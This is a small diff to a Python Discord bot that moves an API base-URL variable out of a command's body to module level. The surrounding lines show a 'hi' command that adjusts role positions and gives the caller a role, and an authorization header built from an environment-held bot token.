@@ -101,7 +101,7 @@ async def hi(ctx):
     await ctx.guild.edit_role_positions(positions = pos)
     await ctx.author.add_roles(r)
 
-    path = "https://discord.com/api/v6"
+path = "https://discord.com/api/v6"
 headers = {
     "Authorization": f"Bot {os.getenv('BOT_TOKEN')}"
 }
